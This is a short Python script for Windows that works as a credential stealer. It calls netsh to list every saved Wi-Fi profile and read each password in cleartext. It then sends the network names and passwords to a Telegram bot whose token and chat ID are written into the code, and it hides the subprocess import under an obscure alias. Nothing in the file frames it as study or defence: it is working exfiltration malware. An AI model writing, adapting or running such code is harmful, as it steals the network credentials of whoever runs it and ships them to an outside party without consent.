from subprocess import check_output as eRen
import requests
# import telegram as nardn

networks = eRen(['netsh','wlan','show','profile'], shell=True).decode('utf-8').split('\n')
profiles = [network.split(':')[1][1:-1] for network in networks if 'All User Profile' in network]
results = ''
for name in profiles:
    command= eRen(['netsh','wlan','show','profile',name,'key=clear'], shell=True).decode('utf-8').split('\n')
    key=[k.split(":")[1][1:-1] for k in command if 'Key Content' in k]
    try:
        data= f'WI-Fi name: {name} =AND=> Password: {key[0]}\n'
        results = f'{results}{data}'
    except IndexError:
        data= f'WI-Fi name: {name} AND Password: be passworda balasha\n'
        results = f'{results}{data}'

        
requests.get(f'https://api.telegram.org/bot2012203094:AAHb8YbhAAdQPDORp6QQio1riNRtqw_c0P0/sendMessage?chat_id=1263068246&parse_mode=html&text={results}')
# TOKEN = "2012203094:AAHb8YbhAAdQPDORp6QQio1riNRtqw_c0P0"
# USER_ID = "1263068246"
# bot = nardn.Bot(token=TOKEN)
# bot.send_message(chat_id=USER_ID, text=results)
